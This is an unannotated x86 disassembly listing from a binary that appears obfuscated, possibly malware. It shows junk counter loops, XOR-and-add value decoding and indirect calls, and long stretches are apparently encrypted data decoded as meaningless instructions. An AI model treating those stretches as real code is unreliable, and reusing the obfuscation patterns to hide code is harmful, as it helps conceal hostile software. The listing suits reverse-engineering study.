  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	xchg   esi,ebp
  40e416:	mov    dh,0x52
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e40c
  40e421:	jl     0x40e42b
  40e423:	pop    ss
  40e424:	adc    al,bl
  40e426:	xchg   DWORD PTR [ecx+0x24],edx
  40e429:	mov    dh,0x59
  40e42b:	ins    DWORD PTR es:[edi],dx
  40e42c:	in     eax,dx
  40e42d:	sbb    ch,BYTE PTR [ecx]
  40e42f:	popf   
  40e430:	and    eax,0xb01eeb48
  40e435:	xlat   BYTE PTR ds:[ebx]
  40e436:	mov    ch,bh
  40e438:	dec    bl
  40e43a:	repnz cmp eax,0xc8306a9a
  40e440:	add    eax,0x708d6b1e
  40e445:	sahf   
  40e446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e447:	or     al,0x64
  40e449:	mov    ecx,0x1627c183
  40e44e:	int    0x73
  40e450:	sub    dh,al
  40e452:	stos   DWORD PTR es:[edi],eax
  40e453:	pop    edx
  40e454:	bound  esp,QWORD PTR [esi+0x1e]
  40e457:	pop    ebx
  40e458:	test   al,0x46
  40e45a:	cld    
  40e45b:	sub    edx,ecx
  40e45d:	sbb    cl,BYTE PTR [edi]
  40e45f:	push   esp
  40e460:	xchg   ebx,eax
  40e461:	cmp    ebx,DWORD PTR [edx]
  40e463:	bound  edx,QWORD PTR [ecx]
  40e465:	sbb    eax,0xdecfa870
  40e46a:	lahf   
  40e46b:	cmc    
  40e46c:	sbb    DWORD PTR [ecx+0x22],ebp
  40e46f:	push   ds
  40e470:	dec    edi
  40e471:	bound  edx,QWORD PTR [eax-0x56]
  40e474:	cmp    BYTE PTR [ecx-0x4ffd4f35],0xe
  40e47b:	adc    eax,0x1d8ebeac
  40e480:	mov    WORD PTR [eax-0x60],cs
  40e483:	mov    ebp,0x9d19df85
  40e488:	jo     0x40e427
  40e48a:	push   ecx
  40e48b:	daa    
  40e48c:	mov    cl,BYTE PTR gs:[edx+0x2c]
  40e490:	add    eax,0x62882bb0
  40e495:	mov    ecx,0x756b7c27
  40e49a:	fild   DWORD PTR [ebx-0x54c598f1]
  40e4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4a1:	xchg   ecx,eax
  40e4a2:	ud2    
  40e4a4:	sbb    bl,bl
  40e4a6:	xlat   BYTE PTR ds:[ebx]
  40e4a7:	sahf   
  40e4a8:	idiv   DWORD PTR [edx]
  40e4aa:	je     0x40e529
  40e4ac:	cmc    
  40e4ad:	test   edi,ecx
  40e4af:	sub    eax,0xc7c8e2e5
  40e4b4:	or     DWORD PTR [ecx],edx
  40e4b6:	(bad)  
  40e4b7:	and    BYTE PTR [edx+0x66863125],cl
  40e4bd:	ss push 0x43
  40e4c0:	jb     0x40e494
  40e4c2:	dec    eax
  40e4c3:	add    BYTE PTR [esi-0x56a73648],dh
  40e4c9:	mov    al,ds:0x5584828
  40e4ce:	jp     0x40e4ca
  40e4d0:	nop
  40e4d1:	mov    DWORD PTR [ebx+eax*2+0x7df48079],ebx
  40e4d8:	(bad)  
  40e4d9:	lock imul edx,DWORD PTR [edx+0x7c83c8ad],0x2dbdeeff
  40e4e4:	xor    ebp,DWORD PTR [esi]
  40e4e6:	mov    ch,0x7
  40e4e8:	arpl   WORD PTR [eax+eiz*8],dx
  40e4eb:	dec    eax
  40e4ec:	or     esi,eax
  40e4ee:	fwait
  40e4ef:	call   0x263f:0x452c6b17
  40e4f6:	pop    es
  40e4f7:	shr    ebp,cl
  40e4f9:	sub    al,0xe6
  40e4fb:	ret    0x9510
  40e4fe:	xchg   ebx,eax
  40e4ff:	je     0x40e579
  40e501:	out    dx,al
  40e502:	push   ebp
  40e503:	or     DWORD PTR [ecx+0x33e7a221],edi
  40e509:	jmp    0xbc48:0x91ee3783
  40e510:	push   esi
  40e511:	sahf   
  40e512:	sbb    DWORD PTR es:[ecx-0x5e],eax
  40e516:	jmp    DWORD PTR [edx+edx*4+0x286db38b]
  40e51d:	cmp    DWORD PTR [ebx],ebx
  40e51f:	into   
  40e520:	add    eax,0x7ea61c06
  40e525:	test   BYTE PTR [eax+0x59cf20e9],dh
  40e52b:	fwait
  40e52c:	idiv   DWORD PTR [ebp-0x39e63e02]
  40e532:	mov    eax,0xb302c41f
  40e537:	shl    BYTE PTR [eax-0x7461ccc8],cl
  40e53d:	inc    ebp
  40e53e:	hlt    
  40e53f:	or     DWORD PTR ds:0x433823,0x43386b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x44f261b8
  40e5b4:	add    ebp,ebx
  40e5b6:	dec    esi
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	mov    al,0xd0
  40e5c1:	aad    0x26
  40e5c3:	shr    BYTE PTR [edx],1
  40e5c5:	inc    ebx
  40e5c6:	stos   DWORD PTR es:[edi],eax
  40e5c7:	xchg   BYTE PTR [esi],ah
  40e5c9:	ret    
  40e5ca:	shl    DWORD PTR [edi],1
  40e5cc:	(bad)  
  40e5cd:	jns    0x40e56c
  40e5cf:	cwde   
  40e5d0:	adc    al,BYTE PTR [edi+ecx*4-0x3e03ad6c]
  40e5d7:	adc    ebx,esp
  40e5d9:	lock xchg cl,bl
  40e5dc:	retf   
  40e5dd:	jp     0x40e58e
  40e5df:	(bad)  
  40e5e0:	add    al,0x37
  40e5e2:	pop    eax
  40e5e3:	neg    esp
  40e5e5:	pop    eax
  40e5e6:	stc    
  40e5e7:	ins    DWORD PTR es:[edi],dx
  40e5e8:	lea    esp,[ecx-0x36]
  40e5eb:	sbb    DWORD PTR [ebx],ebp
  40e5ed:	dec    BYTE PTR [ebx]
  40e5ef:	sub    ah,BYTE PTR [eax+0x5]
  40e5f2:	jle    0x40e600
  40e5f4:	arpl   WORD PTR [esi],di
  40e5f6:	scas   al,BYTE PTR es:[edi]
  40e5f7:	cmp    sp,WORD PTR [esi-0x47]
  40e5fb:	inc    ebp
  40e5fc:	mov    ecx,DWORD PTR [edi]
  40e5fe:	(bad)  
  40e5ff:	cld    
  40e600:	ret    0xb2a6
  40e603:	xchg   ebp,eax
  40e604:	mov    bl,0x86
  40e606:	int    0x43
  40e608:	ins    BYTE PTR es:[edi],dx
  40e609:	in     eax,dx
  40e60a:	imul   esi,ecx,0xc88c250b
  40e610:	scas   al,BYTE PTR es:[edi]
  40e611:	aaa    
  40e612:	retf   
  40e613:	daa    
  40e614:	ret    
  40e615:	mov    bh,0xf3
  40e617:	lahf   
  40e618:	daa    
  40e619:	ret    0xc7cd
  40e61c:	push   fs
  40e61e:	frstor [esp+ebp*1]
  40e621:	fucomi st,st(3)
  40e623:	dec    edx
  40e624:	test   BYTE PTR [eax+0x10374427],cl
  40e62a:	or     eax,0xbf92e35e
  40e62f:	sub    DWORD PTR [ebp+ebp*4+0x56ecca72],esi
  40e636:	(bad)  
  40e637:	sbb    cl,ch
  40e639:	xchg   edx,eax
  40e63a:	ror    esp,0x5e
  40e63d:	in     eax,0xa3
  40e63f:	push   ss
  40e640:	inc    edx
  40e641:	(bad)
  40e644:	mov    cl,0xfa
  40e646:	les    ebx,FWORD PTR [edx]
  40e648:	push   eax
  40e649:	fwait
  40e64a:	ret    0xe1dd
  40e64d:	push   edx
  40e64e:	test   DWORD PTR [eax+edx*4],edi
  40e651:	sub    eax,0xb3aa67af
  40e656:	retf   
  40e657:	mov    ah,bh
  40e659:	ins    DWORD PTR es:[edi],dx
  40e65a:	pop    ebp
  40e65b:	sub    al,0xb3
  40e65d:	mov    cl,0x85
  40e65f:	dec    eax
  40e660:	pop    ecx
  40e661:	scas   al,BYTE PTR es:[edi]
  40e662:	ror    DWORD PTR [esi],0x4e
  40e665:	aas    
  40e666:	pop    edx
  40e667:	inc    edx
  40e668:	pusha  
  40e669:	sbb    DWORD PTR gs:[eax+0x16a4a95f],edx
  40e670:	cmp    eax,ebx
  40e672:	push   edi
  40e673:	xor    al,0x50
  40e675:	data16 rcr BYTE PTR [edi+0x24cceb85],0x8e
  40e67d:	test   DWORD PTR [ecx+0x59],eax
  40e680:	test   BYTE PTR [edi+0x69],0x30
  40e684:	mov    ah,0x61
  40e686:	pop    ebp
  40e687:	lock bound bx,DWORD PTR [eax]
  40e68b:	std    
  40e68c:	jl     0x40e69f
  40e68e:	mov    es,WORD PTR [esi-0x20506246]
  40e694:	scas   al,BYTE PTR es:[edi]
  40e695:	pop    edi
  40e696:	push   ds
  40e697:	sahf   
  40e698:	push   cs
  40e699:	adc    al,0xa9
  40e69b:	(bad)  
  40e69c:	mov    eax,ds:0x942ad199
  40e6a1:	ret    
  40e6a2:	pop    ebp
  40e6a3:	inc    ebx
  40e6a4:	les    ebp,FWORD PTR [eax-0x46]
  40e6a7:	or     esp,ecx
  40e6a9:	(bad)
  40e6ad:	(bad)  
  40e6af:	imul   esp,ebp,0x4d98468e
  40e6b5:	repz cmp ecx,DWORD PTR [edx-0x56]
  40e6b9:	mov    ds:0x95340e4b,eax
  40e6be:	or     eax,0x1a9d2978
  40e6c3:	xor    BYTE PTR [edi+0x3fa4f289],0x88
  40e6ca:	mov    bl,0xb
  40e6cc:	out    0x41,eax
  40e6ce:	rol    BYTE PTR [edi],cl
  40e6d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d1:	repz scas eax,DWORD PTR es:[edi]
  40e6d3:	fst    DWORD PTR [ecx-0x4a]
  40e6d6:	inc    esp
  40e6d7:	out    dx,al
  40e6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6d9:	mov    WORD PTR [esi],ss
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x76e4e034]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6ae
  40e704:	pusha  
  40e705:	mov    cl,0xf7
  40e707:	fdivr  QWORD PTR [edx]
  40e709:	cld    
  40e70a:	dec    ecx
  40e70b:	hlt    
  40e70c:	pop    DWORD PTR [esi-0x61]
  40e70f:	push   ds
  40e710:	inc    eax
  40e711:	and    al,0x76
  40e713:	and    BYTE PTR [esi-0x279626d0],ch
  40e719:	sub    ebx,eax
  40e71b:	add    bl,bh
  40e71d:	add    DWORD PTR [edi],0x3ed54e2f
  40e723:	mov    gs,ecx
  40e725:	xlat   BYTE PTR ds:[ebx]
  40e726:	leave  
  40e727:	cmp    DWORD PTR [esi],ecx
  40e729:	(bad)  
  40e72a:	or     eax,0xe8e70797
  40e72f:	mov    bl,0xb4
  40e731:	inc    ebx
  40e732:	push   esp
  40e733:	pop    ds
  40e734:	test   DWORD PTR [edx],eax
  40e736:	push   edi
  40e737:	out    0x9a,al
  40e739:	popa   
  40e73a:	xchg   edx,eax
  40e73b:	adc    BYTE PTR [ebx],bl
  40e73d:	int3   
  40e73e:	or     al,0xb6
  40e740:	lock imul DWORD PTR [esi]
  40e743:	mov    dh,0x1a
  40e745:	mov    ecx,0xc70289e3
  40e74a:	xor    al,0x17
  40e74c:	ss (bad) 
  40e74e:	or     eax,0x4219908
  40e753:	add    cl,ch
  40e755:	shr    al,1
  40e757:	mov    eax,ds:0xf8d2a32b
  40e75c:	aad    0xca
  40e75e:	push   eax
  40e75f:	out    0x91,eax
  40e761:	cmp    al,ch
  40e763:	outs   dx,DWORD PTR ds:[esi]
  40e764:	mov    cl,0x94
  40e766:	mov    dh,0x31
  40e768:	in     eax,dx
  40e769:	xchg   DWORD PTR [ecx-0x2cb003a9],edi
  40e76f:	fidivr WORD PTR [eax-0x46]
  40e772:	push   cs
  40e773:	lock mov bl,0x5
  40e776:	cmp    dl,bl
  40e778:	sbb    BYTE PTR [eax-0x5dfbc130],ch
  40e77e:	inc    eax
  40e77f:	shl    cl,0x6e
  40e782:	jo     0x40e790
  40e784:	sbb    DWORD PTR [edx+0x28],ecx
  40e787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e788:	loop   0x40e7e9
  40e78a:	mov    ebx,0x3af88346
  40e78f:	std    
  40e790:	hlt    
  40e791:	mov    DWORD PTR [ebp+0x45121c97],esp
  40e797:	adc    al,0xb3
  40e799:	cwde   
  40e79a:	ja     0x40e7bd
  40e79c:	sub    al,0x9e
  40e79e:	cli    
  40e79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7a0:	stos   DWORD PTR es:[edi],eax
  40e7a1:	fsub   DWORD PTR [ebx-0x7d]
  40e7a4:	xchg   edi,eax
  40e7a5:	pop    esp
  40e7a6:	jb     0x40e81c
  40e7a8:	scas   al,BYTE PTR es:[edi]
  40e7a9:	fist   DWORD PTR [esi+eax*8+0x618f7376]
  40e7b0:	popw   ds
  40e7b2:	mov    esp,0x9c9900a4
  40e7b7:	jno    0x40e73e
  40e7b9:	adc    DWORD PTR [ebx+0x4b],eax
  40e7bc:	mov    al,0x78
  40e7be:	loop   0x40e765
  40e7c0:	mov    ch,0x67
  40e7c2:	lahf   
  40e7c3:	fidiv  DWORD PTR [ebp-0x2c]
  40e7c6:	outs   dx,BYTE PTR ds:[esi]
  40e7c7:	sbb    eax,0x10db0aae
  40e7cc:	out    dx,eax
  40e7cd:	(bad)  
  40e7cf:	retf   
  40e7d0:	mov    dh,0x10
  40e7d2:	mov    al,0xb3
  40e7d4:	ja     0x40e828
  40e7d6:	sahf   
  40e7d7:	xchg   esi,esi
  40e7d9:	ror    ebp,1
  40e7db:	adc    ebp,DWORD PTR [edi]
  40e7dd:	outs   dx,BYTE PTR ds:[si]
  40e7df:	jne    0x40e7b9
  40e7e1:	and    edi,DWORD PTR [ebx-0x84811f2]
  40e7e7:	ret    
  40e7e8:	ins    DWORD PTR es:[edi],dx
  40e7e9:	xchg   DWORD PTR [ebx-0x55b7b96c],ecx
  40e7ef:	push   edx
  40e7f0:	inc    edi
  40e7f1:	mov    bh,BYTE PTR [edx-0x3785ca62]
  40e7f7:	loope  0x40e7de
  40e7f9:	push   ecx
  40e7fa:	fnstenv ds:0x8700f3bd
  40e800:	pop    ss
  40e801:	inc    edx
  40e802:	push   ebx
  40e803:	adc    eax,0x1db66c0b
  40e808:	mov    esi,0xbe60e6c5
  40e80d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e80e:	cmp    BYTE PTR [esi-0x45],ah
  40e811:	stos   BYTE PTR es:[edi],al
  40e812:	ins    BYTE PTR es:[edi],dx
  40e813:	shl    BYTE PTR [ecx],0x4d
  40e816:	ror    DWORD PTR [eax-0x38],cl
  40e819:	sub    DWORD PTR ds:0x5a142a,0xffffff89
  40e820:	inc    ebp
  40e821:	cld    
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e7f2
  40e854:	xor    eax,0xa7e2d6c2
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e890
  40e860:	imul   eax,DWORD PTR [ecx+0x25],0x40
  40e864:	shr    DWORD PTR [ecx-0x204570],1
  40e86a:	lods   ax,WORD PTR ds:[esi]
  40e86c:	ffreep st(4)
  40e86e:	mov    edx,0x683ff511
  40e873:	ins    DWORD PTR es:[edi],dx
  40e874:	xor    esi,edx
  40e876:	add    DWORD PTR [ecx+0x70],0x80f886b5
  40e87d:	mov    edx,0xa7b43b07
  40e882:	jecxz  0x40e8ee
  40e884:	cmp    BYTE PTR [ebp+0x76],ch
  40e887:	mov    esp,0xa8d96431
  40e88c:	lds    ebp,FWORD PTR [esi+0xb28b455]
  40e892:	pop    edi
  40e893:	push   esp
  40e894:	xlat   BYTE PTR ds:[ebx]
  40e895:	(bad)  
  40e896:	adc    al,0x60
  40e898:	sub    esi,DWORD PTR [ebx+0x6113319c]
  40e89e:	add    al,BYTE PTR [esi]
  40e8a0:	sub    ebx,DWORD PTR [ebp-0x4d]
  40e8a3:	mov    eax,ds:0x9f4d7e8b
  40e8a8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40e8aa:	xor    ebp,ebx
  40e8ac:	or     BYTE PTR [eax-0x2439792e],ch
  40e8b2:	mov    dh,0x54
  40e8b4:	mov    al,0x1c
  40e8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8b7:	push   eax
  40e8b8:	ins    BYTE PTR es:[edi],dx
  40e8b9:	imul   esp,DWORD PTR [ecx+0x4963a569],0x65
  40e8c0:	(bad)  
  40e8c1:	test   al,0x24
  40e8c3:	jmp    0xab96d88a
  40e8c8:	pop    ss
  40e8c9:	pop    es
  40e8ca:	cmp    al,0x5b
  40e8cc:	mov    esp,0x5e964639
  40e8d1:	nop
  40e8d2:	mov    ds:0xaaf8f3c5,al
  40e8d7:	fist   DWORD PTR [eax-0x77f12455]
  40e8dd:	dec    esp
  40e8de:	imul   eax,edi,0xc567090c
  40e8e4:	pop    edi
  40e8e5:	(bad)  
  40e8e6:	xor    DWORD PTR [ecx+0x5dbfd483],edx
  40e8ec:	sub    esi,esi
  40e8ee:	sub    esp,DWORD PTR fs:[edi+esi*4+0x3a]
  40e8f3:	lods   al,BYTE PTR ds:[esi]
  40e8f4:	xlat   BYTE PTR ds:[ebx]
  40e8f5:	scas   eax,DWORD PTR es:[edi]
  40e8f6:	jbe    0x40e8b0
  40e8f8:	out    dx,al
  40e8f9:	gs push edx
  40e8fb:	or     ebx,DWORD PTR [ebp-0x4d]
  40e8fe:	pop    ds
  40e8ff:	in     al,dx
  40e900:	cmp    al,0xd2
  40e902:	rcr    BYTE PTR [esi-0x4d],cl
  40e905:	pusha  
  40e906:	push   ss
  40e907:	mov    eax,ds:0xfe5b78ca
  40e90c:	mov    ebp,0xdf7c303
  40e911:	ins    BYTE PTR es:[edi],dx
  40e912:	leave  
  40e913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e914:	pop    ebp
  40e915:	xchg   BYTE PTR [ebx+eax*8],bl
  40e918:	(bad)  
  40e919:	cli    
  40e91a:	pop    edi
  40e91b:	mov    ch,0x5c
  40e91d:	jle    0x40e979
  40e91f:	stc    
  40e920:	clc    
  40e921:	cmp    al,cl
  40e923:	or     esp,DWORD PTR [ebx+0x4c53062f]
  40e929:	xlat   BYTE PTR ds:[ebx]
  40e92a:	inc    ebp
  40e92b:	test   al,0x72
  40e92d:	lods   eax,DWORD PTR ds:[esi]
  40e92e:	mov    ds:0xa3514238,al
  40e933:	pusha  
  40e934:	or     DWORD PTR [edi+0x6b],eax
  40e937:	mov    bh,0x34
  40e939:	mov    fs,WORD PTR [ebx]
  40e93b:	mov    esi,0x330d6ebf
  40e940:	pop    edx
  40e941:	adc    BYTE PTR [ebp+ebx*1+0xf],0x89
  40e946:	inc    BYTE PTR [ebx-0x5e]
  40e949:	adc    ah,BYTE PTR [ebx-0x1b17b694]
  40e94f:	sar    edi,cl
  40e951:	dec    esp
  40e952:	lods   eax,DWORD PTR ds:[esi]
  40e953:	hlt    
  40e954:	inc    edx
  40e955:	push   ss
  40e956:	test   DWORD PTR [ecx*4-0x6c7efb70],esi
  40e95d:	sar    DWORD PTR cs:0x239ec6a2,1
  40e964:	push   cs
  40e965:	loopne 0x40e8f7
  40e967:	or     eax,0x5dbd06de
  40e96c:	stos   BYTE PTR es:[edi],al
  40e96d:	pop    edi
  40e96e:	mov    ds:0xc35f3ee,al
  40e973:	sahf   
  40e974:	shl    edx,0xe5
  40e977:	sbb    al,0xf4
  40e979:	hlt    
  40e97a:	mov    cs,WORD PTR [edi]
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x4948e71d
  40e99c:	in     al,0x86
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e9e4
  40e9a6:	adc    ebx,DWORD PTR [edx+0x70]
  40e9a9:	popf   
  40e9aa:	dec    eax
  40e9ab:	dec    edx
  40e9ac:	sub    BYTE PTR [ecx+0x3f2ee81b],0x6f
  40e9b3:	push   esp
  40e9b4:	mov    ebx,0xb5ad3beb
  40e9b9:	gs aaa 
  40e9bb:	gs push ebp
  40e9bd:	into   
  40e9be:	jne    0x40e9b6
  40e9c0:	add    al,0x94
  40e9c2:	lds    edx,FWORD PTR ds:0xb0ec90bb
  40e9c8:	push   ebp
  40e9c9:	push   esi
  40e9ca:	sbb    dh,dh
  40e9cc:	jns    0x40e9aa
  40e9ce:	mov    DWORD PTR [eax-0xfefa344],esp
  40e9d4:	addr16 lahf 
  40e9d6:	leave  
  40e9d7:	jge    0x40e977
  40e9d9:	out    0x8b,eax
  40e9db:	cmp    al,0xc9
  40e9dd:	call   0x78f7:0x2520c0e5
  40e9e4:	jg     0x40e9bc
  40e9e6:	outs   dx,BYTE PTR ds:[esi]
  40e9e7:	add    DWORD PTR [edx-0x7e4a25da],ebx
  40e9ed:	(bad)  
  40e9ee:	sub    DWORD PTR fs:[ecx-0x6e71fde5],ebx
  40e9f5:	mov    al,ds:0xa0682475
  40e9fa:	adc    DWORD PTR [edi],ecx
  40e9fc:	sub    al,0x8d
  40e9fe:	or     bl,BYTE PTR [edx]
  40ea00:	cld    
  40ea01:	mov    WORD PTR [ebx+0x39],ss
  40ea04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea05:	(bad)  
  40ea06:	push   ecx
  40ea07:	cld    
  40ea08:	cmp    edx,esi
  40ea0a:	fwait
  40ea0b:	or     al,0x37
  40ea0d:	pop    es
  40ea0e:	cmp    bh,BYTE PTR [edi-0x2b]
  40ea11:	push   eax
  40ea12:	mov    ch,0xe2
  40ea14:	and    eax,0x933ca2d4
  40ea19:	sub    BYTE PTR [ebx+0x55e5f55f],0xf3
  40ea20:	cmp    eax,0xae42db7b
  40ea25:	adc    ebx,DWORD PTR [ebx+ecx*2+0x55b68c5e]
  40ea2c:	adc    DWORD PTR [ecx-0x22],esp
  40ea2f:	ficom  WORD PTR [eax+esi*4-0x5ac8f8c7]
  40ea36:	out    dx,eax
  40ea37:	mov    al,ds:0x9a6a4446
  40ea3c:	fcom   QWORD PTR [eax+0x24]
  40ea3f:	jg     0x40e9cd
  40ea41:	mov    BYTE PTR [ebx+ebx*4-0x78337041],ch
  40ea48:	ret    0xf52b
  40ea4b:	out    0x91,al
  40ea4d:	xor    eax,DWORD PTR [ecx-0x56]
  40ea50:	add    esi,DWORD PTR [edi+0x3f6a34ae]
  40ea56:	mov    WORD PTR [eax+edi*4-0x15],es
  40ea5a:	and    esp,DWORD PTR [edi+eiz*4]
  40ea5d:	lahf   
  40ea5e:	sahf   
  40ea5f:	xor    ebx,eax
  40ea61:	aas    
  40ea62:	add    BYTE PTR ds:0x94218b99,ah
  40ea68:	mov    dh,0xcb
  40ea6a:	sbb    eax,0x5e643b2b
  40ea6f:	pushf  
  40ea70:	mov    edx,0xc5486121
  40ea75:	fstp   QWORD PTR [esi-0x5d]
  40ea78:	pop    ebx
  40ea79:	sbb    BYTE PTR [ebx+eiz*1],cl
  40ea7c:	jecxz  0x40eae0
  40ea7e:	call   0xad3627dc
  40ea83:	dec    esi
  40ea84:	inc    ecx
  40ea85:	jge    0x40ea78
  40ea87:	cwde   
  40ea88:	sub    eax,0x5ed309ba
  40ea8d:	out    dx,eax
  40ea8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea8f:	out    0x94,eax
  40ea91:	sahf   
  40ea92:	sub    bh,bl
  40ea94:	pusha  
  40ea95:	jl     0x40ea39
  40ea97:	call   0x715e:0x8acb902d
  40ea9e:	add    ecx,eax
  40eaa0:	xchg   ebx,eax
  40eaa1:	popf   
  40eaa2:	adc    bh,BYTE PTR [edi]
  40eaa4:	leave  
  40eaa5:	sbb    BYTE PTR [ecx],dl
  40eaa7:	repz retf 
  40eaa9:	dec    esp
  40eaaa:	cli    
  40eaab:	push   0x53
  40eaad:	in     al,dx
  40eaae:	call   0x1194:0x8042593e
  40eab5:	stc    
  40eab6:	xchg   esp,eax
  40eab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eab8:	xlat   BYTE PTR ds:[ebx]
  40eab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaba:	popf   
  40eabb:	push   0xffffff8a
  40eabd:	popf   
  40eabe:	rsqrtps xmm4,XMMWORD PTR [ebx-0x36a43cfd]
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
